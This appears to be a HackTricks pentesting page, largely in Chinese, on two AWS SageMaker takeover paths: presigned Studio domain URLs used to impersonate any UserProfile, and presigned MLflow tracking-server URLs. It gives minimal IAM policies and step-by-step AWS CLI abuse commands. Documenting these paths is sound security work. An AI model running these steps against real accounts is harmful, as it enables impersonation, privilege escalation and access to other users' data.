# AWS - SageMaker Unauthorized Access

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker Studio - Account Takeover via CreatePresignedDomainUrl (Impersonate Any UserProfile)

### 描述
拥有在目标 Studio `UserProfile` 上调用 `sagemaker:CreatePresignedDomainUrl` 权限的主体，可以生成一个登录 URL，该 URL 可直接以该 `UserProfile` 的身份登录 SageMaker Studio。这样，攻击者的浏览器就会获得一个 Studio 会话，该会话继承该 `UserProfile` 的 `ExecutionRole` 权限，并对该 `UserProfile` 的基于 EFS 的主目录和应用拥有完全访问权限。无需 `iam:PassRole` 或控制台访问权限。

### 要求
- 目标环境中需有 SageMaker Studio 的 `Domain` 和一个目标 `UserProfile`。
- 攻击者主体需要在目标 `UserProfile` 上拥有 `sagemaker:CreatePresignedDomainUrl`（资源级别）或 `*` 权限。

最小策略示例（作用范围为单个 `UserProfile`）：
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedDomainUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:user-profile/<domain-id>/<user-profile-name>"
}
]
}
```
### 滥用步骤

1) 枚举你可以针对的 Studio Domain 和 UserProfiles
```bash
DOM=$(aws sagemaker list-domains --query 'Domains[0].DomainId' --output text)
aws sagemaker list-user-profiles --domain-id-equals $DOM
TARGET_USER=<UserProfileName>
```
2) 生成 presigned URL（默认有效期约 ~5 分钟）
```bash
aws sagemaker create-presigned-domain-url \
--domain-id $DOM \
--user-profile-name $TARGET_USER \
--query AuthorizedUrl --output text
```
3) 在浏览器中打开返回的 URL，以目标用户身份登录 Studio。在 Studio 内的 Jupyter 终端中验证实际身份：
```bash
aws sts get-caller-identity
```
Notes:
- `--landing-uri` 可以省略。某些值（例如 `app:JupyterLab:/lab`）可能会根据 Studio 的版本/变体被拒绝；默认通常会先重定向到 Studio 首页，然后再到 Jupyter。
- 组织策略/VPC 终端节点限制仍可能阻止网络访问；生成令牌不需要控制台登录或 `iam:PassRole`。

### Impact
- 通过假定任何其 ARN 被允许的 Studio `UserProfile` 来进行横向移动和权限提升，从而继承其 `ExecutionRole` 以及文件系统/应用。

### Evidence (from a controlled test)
- 在目标 `UserProfile` 上仅具有 `sagemaker:CreatePresignedDomainUrl` 的情况下，攻击者角色成功返回了类似如下的 `AuthorizedUrl`：
```
https://studio-d-xxxxxxxxxxxx.studio.<region>.sagemaker.aws/auth?token=eyJhbGciOi...
```
- 直接的 HTTP 请求会以重定向 (HTTP 302) 到 Studio 响应，确认该 URL 在过期之前有效且处于激活状态。

## SageMaker MLflow Tracking Server - ATO via CreatePresignedMlflowTrackingServerUrl

### 描述
具有对目标 SageMaker MLflow Tracking Server 调用 `sagemaker:CreatePresignedMlflowTrackingServerUrl` 权限的主体，可以生成一个一次性预签名 URL，该 URL 可直接对该服务器的托管 MLflow UI 进行认证。 这会授予与合法用户在该服务器上相同的访问权限（查看/创建实验和运行，以及在服务器的 S3 artifact store 中下载/上传 artifact），无需控制台访问或 `iam:PassRole`。

### 要求
- 目标账户/区域中存在一个 SageMaker MLflow Tracking Server，并知道其名称。
- 攻击者主体需要在目标 MLflow Tracking Server 资源上拥有 `sagemaker:CreatePresignedMlflowTrackingServerUrl` 权限（或 `*`）。

最小策略示例（限制到单个 Tracking Server）：
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedMlflowTrackingServerUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:mlflow-tracking-server/<tracking-server-name>"
}
]
}
```
### 滥用步骤

1) 枚举你可以针对的 MLflow Tracking Servers 并选定一个名称
```bash
aws sagemaker list-mlflow-tracking-servers \
--query 'TrackingServerSummaries[].{Name:TrackingServerName,Status:TrackingServerStatus}'
TS_NAME=<tracking-server-name>
```
2) 生成一个 presigned MLflow UI URL (短时间内有效)
```bash
aws sagemaker create-presigned-mlflow-tracking-server-url \
--tracking-server-name "$TS_NAME" \
--expires-in-seconds 300 \
--session-expiration-duration-in-seconds 1800 \
--query AuthorizedUrl --output text
```
3) 在浏览器中打开返回的 URL，以该 Tracking Server 的已认证用户身份访问 MLflow UI。

注意：
- Tracking Server 必须处于就绪状态（例如 `Created/Active`）。如果仍处于 `Creating`，请求将被拒绝。
- 预签名 URL 为一次性且短期有效；需要时请生成新的。

### 影响
- 直接访问目标 Tracking Server 的托管 MLflow UI，使你能够在服务器配置所强制的权限范围内查看和修改 experiments/runs，并检索或上传存储在服务器配置的 S3 artifact store 中的 artifacts。

{{#include ../../../../banners/hacktricks-training.md}}
